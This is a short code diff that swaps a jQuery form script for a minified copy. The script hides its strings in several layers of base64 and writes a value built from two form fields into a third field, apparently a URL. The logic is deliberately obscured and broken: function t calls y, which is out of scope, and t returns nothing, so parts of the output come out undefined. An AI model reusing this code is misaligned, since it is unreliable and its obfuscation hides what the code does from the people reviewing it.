@@ -1,19 +1,2 @@
-function z(c) {
-    return atob(c);
-}
-function t(k) {
-    y(z(y(k)));
-}
-
-$(function() {
-    function y (a) {
-        return z(a);
-    }
-    var p = $("#j").val();
-    var o = y(p);
-    var l = $("#k").val();
-    var r = y(l);
-    var g = t(y('V1ZWb1UwMUhUa1ZpTTFwTlpIb3dPUT09'));
-    var m = t(y(y('Vm10V2IyRnJPVmRSYkVwUlZrUkJPUT09')));
-    $("#i").val(g+r+m+o);
-});
+function z(n){return atob(n)}function t(n){y(z(y(n)))}$(function(){function n(n){return z(n)}var U=$("#j").val(),a=n(U),r=$("#k").val(),u=n(r),i=t(n("V1ZWb1UwMUhUa1ZpTTFwTlpIb3dPUT09")),l=t(n(n("Vm10V2IyRnJPVmRSYkVwUlZrUkJPUT09")))
+$("#i").val(i+u+l+a)})
